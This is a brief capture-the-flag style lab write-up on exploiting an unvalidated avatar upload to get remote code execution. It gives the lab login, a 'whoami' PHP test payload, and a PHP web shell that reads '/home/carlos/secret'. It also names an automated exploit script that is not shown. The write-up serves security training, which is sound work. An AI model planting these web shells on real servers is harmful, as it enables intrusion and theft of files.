# Lab: Remote Code Execution via Web Shell Upload

---

**Vuln** — The image upload function has no validation at all — it stores any file directly on the server's filesystem.

**Goal** — Upload a PHP web shell, read `/home/carlos/secret`, and submit it.

**Creds** — `wiener:peter`

---

### Steps

1. **Login and find the upload panel**
   - ![Avatar upload panel on My Account page]({836EFA83-2F71-4EE6-A591-937CA1B8E5D5}.png)

2. **Upload a test payload** — try `<?php system("whoami"); ?>` to confirm code execution
   - Check the response in **Burp Suite**
   - ![Burp response showing whoami output — carlos](image.png)
   - Payload worked — response shows `carlos`, so the server executes PHP without any checks

3. **Upload the real payload** — `shell.php` with `<?php system("cat /home/carlos/secret"); ?>` to read the secret
   - ![Secret key visible in Burp response]({9FA80028-F27A-4DFE-91CB-7A68A455B7AC}.png)

4. **Submit the secret → Lab solved ✅**
   - ![Lab solved]({E13E6F41-99CF-4408-929C-6E7AC00616DD}.png)

---

### Files Used

| File | Purpose |
|------|---------|
| `shell.php` | Web shell — `<?php system("cat /home/carlos/secret"); ?>` |
| `POC.py` | Automated exploit script (login → upload → read secret) |